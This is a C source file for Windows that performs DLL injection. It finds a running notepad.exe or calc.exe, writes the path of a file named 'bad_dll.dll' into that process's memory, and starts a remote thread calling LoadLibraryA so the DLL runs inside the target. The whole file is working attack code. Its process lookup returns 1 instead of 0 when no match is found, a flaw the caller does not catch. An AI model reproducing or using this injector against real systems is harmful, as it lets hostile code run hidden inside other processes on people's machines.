#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#include "get_relative_path.h"
#include "attack.h"


DWORD get_pid_from_list(const char *names[], size_t count)
{
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 1;

    if (Process32First(snapshot, &pe)) {
        do {
            for (size_t i = 0; i < count; i++) {
                if (_stricmp(pe.szExeFile, names[i]) == 0) {
                    CloseHandle(snapshot);
                    return pe.th32ProcessID;
                }
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return 1; // No process found
}

int main(void) {
    // List of process names to target
    const char *processes[] = {
        "notepad.exe",
        "calc.exe",
    };

    char dll[MAX_PATH];
    if (get_relative_path(dll, sizeof(dll), "bad_dll.dll") != 0) {
        return 1;
    }

    DWORD pid = get_pid_from_list(processes, sizeof(processes) / sizeof(processes[0]));

    if (!pid)
        return 1;

    // Get process handle
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (h_process == NULL)
    {
        return 1;
    }

    // Allocate memory
    LPVOID mem_alloc = VirtualAllocEx(h_process, NULL, strlen(dll) + 1, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

    if (mem_alloc == NULL)
    {
        return 1;
    }

    // Write dll into memory
    WriteProcessMemory(h_process, mem_alloc, dll, strlen(dll) + 1, NULL);

    // Get handle to kernel32.dll
    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");

    if (h_kernel32 == NULL)
    {
        return 1;
    }

    // Create thread executing the dll
    FARPROC load_library_addr = GetProcAddress(h_kernel32, "LoadLibraryA");
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_addr, mem_alloc, 0, NULL);

    if (h_thread == NULL)
    {
        return 1;
    }

    // Wait and close
    WaitForSingleObject(h_thread, INFINITE);
    CloseHandle(h_process);

    return 0;
}